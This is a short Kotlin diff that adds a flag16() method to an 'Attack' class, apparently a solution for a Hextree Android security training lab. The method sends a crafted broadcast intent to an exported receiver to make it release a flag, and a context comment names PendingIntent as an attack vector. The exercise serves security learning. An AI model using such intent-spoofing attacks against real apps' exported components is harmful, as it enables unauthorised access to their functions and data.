@@ -276,6 +276,15 @@ class Attack(private val context: Context, private val activity: HextreeActivity
 		context.startActivity(intent)
 	}
 
+	fun flag16() {
+		val receiverPath = "$packageName.receivers.Flag16Receiver"
+		val intent = Intent().apply {
+			setClassName(packageName, receiverPath)
+			putExtra("flag", "give-flag-16")
+		}
+		activity.sendBroadcast(intent)
+	}
+
 	/**
 	 * FLAG 22 - Receive Pending Intent
 	 * Technique: PendingIntent as Attack Vector
